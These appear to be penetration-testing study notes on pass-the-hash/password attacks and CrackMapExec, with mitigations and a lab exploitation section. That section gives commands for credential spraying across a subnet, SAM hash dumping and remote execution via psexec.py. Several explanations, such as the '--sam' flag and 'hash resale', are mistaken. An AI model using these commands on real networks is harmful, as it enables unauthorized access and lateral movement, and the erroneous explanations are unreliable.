### Overview
A "Pass-the-Hash/Password" (PtH/P) attack is a common technique used by attackers to gain unauthorized access to a system or network using hashed credentials, such as NTLM (NT LAN Manager) hashes, without knowing the actual plaintext password. The attack is possible because Windows systems store password hashes instead of actual passwords in the Local Security Authority (LSA) database.

**V. Imp Note:** You can pass NTLM Hashes But Not NTLMv2 Hashes

#### Features
1. **Credential Harvesting:** The attacker first gains access to a user's hashed credentials, usually by using various techniques like network sniffing, keylogging, or other methods to extract the hash from the compromised system or network.
2. **Hash Extraction:** The attacker obtains the NTLM hash from the compromised system's LSA or other locations where hashes might be stored.
3. **Hash Resale:** Instead of attempting to crack the hash and find the plaintext password, the attacker simply "resales" the obtained hash without needing to know the actual password. The stolen hash can be used directly in authentication protocols to impersonate the user.
4. **Authentication Impersonation:** The attacker uses the stolen hash as a substitute for the actual password when authenticating to other systems on the network. Since Windows systems use NTLM authentication, the stolen hash is accepted as a valid credential, granting the attacker access as the compromised user.
5. **Lateral Movement:** Once the attacker gains access to a system using PtH, they can perform lateral movement within the network, using the same technique to pass the hash from one system to another, escalating privileges and compromising more systems.

#### Mitigation
1. **Strong Credential Storage:** Use strong encryption mechanisms like Kerberos, which avoids storing password hashes and relies on ticket-based authentication.
2. **Pass-the-Ticket (PtT) Mitigation:** Implementing defenses against PtT attacks by regularly refreshing Kerberos tickets and monitoring for suspicious activity.
3. **Multi-Factor Authentication (MFA):** Enforcing MFA adds an extra layer of security and makes it harder for attackers to impersonate users even if they obtain hashed credentials.
4. **Least Privilege:** Limit user privileges to only what is necessary for their role, reducing the potential impact of a compromised account.
5. **Credential Guard:** Windows Credential Guard is a feature that can help protect against PtH attacks by securely isolating credentials.
6. **Monitoring and Logging:** Continuously monitor network activity for unusual patterns and log authentication events to detect potential PtH attacks.

### Crack Map Exec
CrackMapExec (CME) is a popular open-source post-exploitation and penetration testing tool designed for offensive security assessments. It is written in Python and used for enumeration, exploitation, and lateral movement in Windows networks. CrackMapExec is especially useful for interacting with Windows networks and Active Directory environments.

#### Features
1. **Enumeration:** CME can be used to perform various enumeration tasks on target systems, including listing shares, users, groups, sessions, open ports, and more.
2. **Exploitation:** It supports various exploitation modules, allowing users to perform attacks like pass-the-hash, pass-the-ticket, and Kerberoasting.
3. **Lateral Movement:** CME enables lateral movement across Windows networks by leveraging stolen credentials to authenticate to other systems and execute commands.
4. **Interactive Shell:** The tool provides an interactive shell for executing commands on compromised hosts.
5. **Powershell Command Execution:** It supports executing PowerShell commands remotely on target systems.
6. **Brute-Force:** CME can perform password spraying and brute-force attacks to gain unauthorized access.
7. **Kerberos Ticket Handling:** It can handle Kerberos tickets, including exporting and importing tickets.
8. **Session Management:** CME manages and maintains sessions, which are essential for post-exploitation tasks.

### Exploitation
##### Passing the Password
```bash
$ crackmapexec smb 192.168.57.0//24

$ crackmapexec smb 192.168.57.0//24 -u fcastle -d Marvel.local -p Password1

$ crackmapexec smb 192.168.57.0//24 -u fcastle -d Marvel.local -p Password1 --sam

$ psexec.py marvel/fcatle:Password1@192.168.57.142
```
**Explanation:**
1. `$ crackmapexec smb 192.168.57.0//24 -u fcastle -d Marvel.local -p Password1`
	- This command is using CrackMapExec (CME) to interact with SMB services (Windows file sharing) on a range of IP addresses within the subnet 192.168.57.0/24.
	- `-u fcastle` specifies the username "fcastle" to authenticate with on target systems.
	- `-d Marvel.local` specifies the Active Directory domain "Marvel.local" to authenticate within the Windows network.
	- `-p Password1` provides the plaintext password "Password1" to use for authentication.
	- The purpose of this command is to attempt to authenticate to the SMB services on all IP addresses in the given subnet using the provided username and password. If successful, it could potentially allow access to shared resources and lateral movement within the network.
2. `$ crackmapexec smb 192.168.57.0//24 -u fcastle -d Marvel.local -p Password1 --sam`
	- This command is similar to the previous one but includes the `--sam` flag.
	- The `--sam` flag instructs CrackMapExec to use the Security Account Manager (SAM) database for authentication instead of the default LSASS (Local Security Authority Subsystem Service) database.
	- The SAM database stores local user account credentials on a Windows system. Using this option may allow CME to authenticate with local user credentials on target systems.
3. `$ psexec.py marvel/fcatle:Password1@192.168.57.142`
	- This command uses the psexec.py script, which is part of the Impacket library, to execute commands remotely on a target system with IP address 192.168.57.142.
	- `marvel/fcastle` represents the domain and username to authenticate with on the target system.
	- `Password1` is the plaintext password associated with the provided username.
	- The purpose of this command is to execute commands on the target system using the credentials provided. psexec.py is a powerful tool for remote command execution on Windows systems and is commonly used for lateral movement in post-exploitation scenarios.
